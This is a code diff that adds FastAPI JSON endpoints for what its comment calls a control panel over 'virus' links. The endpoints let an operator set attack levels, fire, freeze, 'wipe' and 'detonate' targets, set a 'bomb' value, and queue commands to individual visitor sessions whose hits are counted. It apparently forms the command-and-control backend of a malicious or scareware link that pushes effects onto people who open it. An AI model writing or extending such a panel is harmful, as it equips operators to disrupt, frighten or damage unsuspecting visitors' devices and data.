@@ -1225,3 +1225,166 @@ async def sg_share(code: str, request: Request, sid: str = ""):
     except Exception:
         pass
     return RedirectResponse(f"/v/{code}/sg?u=share", status_code=303)
+    # ===========================================================================
+# AJAX 操作盤用 JSON API（ページ遷移しない）
+# ===========================================================================
+
+def _api_state(owner, code):
+    c = _db(owner)
+    row = _link(c, code)
+    if not row:
+        c.close()
+        raise HTTPException(404)
+    pend = c.execute("SELECT COUNT(*) n FROM virus_cmd WHERE code=? AND state<2", (code,)).fetchone()["n"]
+    hn = c.execute("SELECT COUNT(*) n FROM virus_hits WHERE code=?", (code,)).fetchone()["n"]
+    c.close()
+    return {"ok": 1, "code": code,
+            "level": int(_val(row, "level", 1) or 0),
+            "firing": int(_val(row, "firing", 1) or 0),
+            "freeze": _val(row, "freeze", "") or "",
+            "wipe_seq": int(_val(row, "wipe_seq", 0) or 0),
+            "winset": int(_val(row, "winset", 100) or 0),
+            "bomb": _val(row, "bomb", "") or "",
+            "inj": int(_val(row, "inj", 1) or 0),
+            "ver": _val(row, "ver", "") or _SG_VER,
+            "hits": hn, "pending": pend, "server": _now()}
+
+
+async def _api_body(request: Request):
+    try:
+        b = await request.json()
+        if isinstance(b, dict):
+            return b
+    except Exception:
+        pass
+    try:
+        f = await request.form()
+        return {k: v for k, v in f.items()}
+    except Exception:
+        return {}
+
+
+@router.get("/api/vp/{code}/state")
+def api_state(code: str, u=Depends(_auth)):
+    owner = tenancy.get_current() or u
+    return _api_state(owner, code)
+
+
+@router.post("/api/vp/{code}/level")
+async def api_level(request: Request, code: str, u=Depends(_auth)):
+    owner = tenancy.get_current() or u
+    b = await _api_body(request)
+    lv = _lv(b.get("level"))
+    c = _db(owner)
+    c.execute("UPDATE virus_links SET level=?, firing=1 WHERE code=?", (lv, code))
+    c.commit()
+    c.close()
+    return _api_state(owner, code)
+
+
+@router.post("/api/vp/{code}/freeze")
+async def api_freeze(request: Request, code: str, u=Depends(_auth)):
+    owner = tenancy.get_current() or u
+    b = await _api_body(request)
+    fz = b.get("freeze") or ""
+    if fz not in ("off", "soft", "hard"):
+        fz = ""
+    c = _db(owner)
+    c.execute("UPDATE virus_links SET freeze=? WHERE code=?", (fz, code))
+    c.commit()
+    c.close()
+    return _api_state(owner, code)
+
+
+@router.post("/api/vp/{code}/fire")
+def api_fire(code: str, u=Depends(_auth)):
+    owner = tenancy.get_current() or u
+    c = _db(owner)
+    c.execute("UPDATE virus_links SET firing=1, seq=COALESCE(seq,0)+1 WHERE code=?", (code,))
+    c.commit()
+    c.close()
+    return _api_state(owner, code)
+
+
+@router.post("/api/vp/{code}/stop")
+def api_stop(code: str, u=Depends(_auth)):
+    owner = tenancy.get_current() or u
+    c = _db(owner)
+    c.execute("UPDATE virus_links SET firing=0 WHERE code=?", (code,))
+    c.commit()
+    c.close()
+    return _api_state(owner, code)
+
+
+@router.post("/api/vp/{code}/set")
+async def api_set(request: Request, code: str, u=Depends(_auth)):
+    owner = tenancy.get_current() or u
+    b = await _api_body(request)
+    try:
+        ws = int(b.get("winset"))
+    except Exception:
+        ws = 100
+    if ws not in SET_CHOICES:
+        ws = 100
+    c = _db(owner)
+    c.execute("UPDATE virus_links SET winset=? WHERE code=?", (ws, code))
+    c.commit()
+    c.close()
+    return _api_state(owner, code)
+
+
+@router.post("/api/vp/{code}/detonate")
+def api_detonate(code: str, u=Depends(_auth)):
+    owner = tenancy.get_current() or u
+    c = _db(owner)
+    c.execute("UPDATE virus_links SET level=6, firing=1, freeze='' WHERE code=?", (code,))
+    c.commit()
+    c.close()
+    return _api_state(owner, code)
+
+
+@router.post("/api/vp/{code}/wipe")
+def api_wipe(code: str, u=Depends(_auth)):
+    owner = tenancy.get_current() or u
+    c = _db(owner)
+    c.execute("UPDATE virus_links SET wipe_seq=COALESCE(wipe_seq,0)+1 WHERE code=?", (code,))
+    c.commit()
+    c.close()
+    return _api_state(owner, code)
+
+
+@router.post("/api/vp/{code}/bomb")
+async def api_bomb(request: Request, code: str, u=Depends(_auth)):
+    owner = tenancy.get_current() or u
+    b = await _api_body(request)
+    c = _db(owner)
+    c.execute("UPDATE virus_links SET bomb=? WHERE code=?", ((b.get("bomb") or "").strip()[:64], code))
+    c.commit()
+    c.close()
+    return _api_state(owner, code)
+
+
+@router.post("/api/vp/{code}/cmd")
+async def api_cmd(request: Request, code: str, u=Depends(_auth)):
+    owner = tenancy.get_current() or u
+    b = await _api_body(request)
+    c = _db(owner)
+    if not _link(c, code):
+        c.close()
+        raise HTTPException(404)
+    c.execute("INSERT INTO virus_cmd(code,sid,kind,arg,state,ts) VALUES(?,?,?,?,0,?)",
+              (code, str(b.get("sid") or "")[:64], str(b.get("kind") or "")[:24],
+               str(b.get("arg") or "")[:400], _now()))
+    c.commit()
+    c.close()
+    return _api_state(owner, code)
+
+
+@router.post("/api/vp/{code}/cmds/clear")
+def api_cmd_clear(code: str, u=Depends(_auth)):
+    owner = tenancy.get_current() or u
+    c = _db(owner)
+    c.execute("DELETE FROM virus_cmd WHERE code=?", (code,))
+    c.commit()
+    c.close()
+    return _api_state(owner, code)
